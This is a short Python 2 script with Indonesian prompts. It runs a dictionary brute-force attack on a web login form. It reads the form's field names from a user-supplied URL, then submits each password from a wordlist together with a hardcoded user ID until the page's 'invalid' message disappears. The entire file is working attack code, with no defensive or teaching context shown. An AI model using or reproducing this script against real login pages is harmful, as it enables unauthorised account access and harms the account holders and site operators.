#!/usr/bin/env python
import ambiltag
import requests
import string
import time
# import urllib
# import re
# from bs4 import BeautifulSoup



input1 = raw_input("Masukkan URL halaman login : ")


#direct_login = raw_input("Masukkan direct : ")
list_variabel_input = ambiltag.fetchListInput(input1)
file = open(raw_input("Masukkan path ke word list yang digunakan : "), 'rt')

for x in file.readlines():
	x = x.strip()
	print "Trying " + x
	data1 = {
		list_variabel_input[1] : "p00000019178",
		list_variabel_input[2] : "%s" %x
	}
	print data1
	response = requests.post(input1, data1)
	if "Your User ID and/or Password are invalid." not in response.text:
		print x + " Success!"
		break	